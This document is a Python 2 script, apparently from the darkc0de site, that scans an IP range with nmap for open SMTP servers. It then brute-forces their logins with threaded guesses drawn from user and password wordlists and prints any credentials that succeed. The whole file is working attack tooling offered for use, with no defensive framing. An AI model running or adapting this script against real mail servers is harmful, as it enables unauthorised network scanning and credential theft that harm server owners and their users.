#!usr/bin/python
#Smtp Brute Forcer, searches ip_range for hosts using smtp.
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, StringIO, commands, random, sys, smtplib, re, socket
from smtplib import SMTP
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./smtpbrute_iprange.py <ip_range> <userlist> <wordlist>"
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   d3hydr8[at]gmail[dot]com smtpBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Scanning:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)

wordlist = copy(words)

def scan():

	iprange = sys.argv[1]
	ip_list = []
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 '+iprange+' -p 25 | grep open -B 3')[1]).readlines()
	
	for tmp in nmap:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ipaddr:
	    		ip_list.append(ipaddr[0])
	return ip_list

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		reloader()
		value = random.sample(words,  1)
		
	lock.release()
	return value[0][:-1]
		
class Workhorse(threading.Thread):
	
	def run(self):
		value = getword()
		try:
			print "-"*12
			print "User:",user[:-1],"Password:",value
			smtp = smtplib.SMTP(ip)
			smtp.login(user[:-1], value)
			print "\t\nLogin successful:",user, value
			smtp.quit()
			work.join()
			sys.exit(2)
		except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg: 
			#print "An error occurred:", msg
			pass
 
ip_list = scan()
print "[+] Hosts Loaded:",len(ip_list),"\n"
for ip in ip_list:
	print "\n\tAttempting BruteForce:",ip,"\n"
	try:	
		helo = smtplib.SMTP(ip)
		print helo.helo(), "\n"
		helo.quit()
	except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException):
		print "Server doesn't support the Helo cmd"
	for user in users:
		for i in range(len(words)):
			if i == 0: reloader()
			work = Workhorse()
			work.start()
			time.sleep(2)
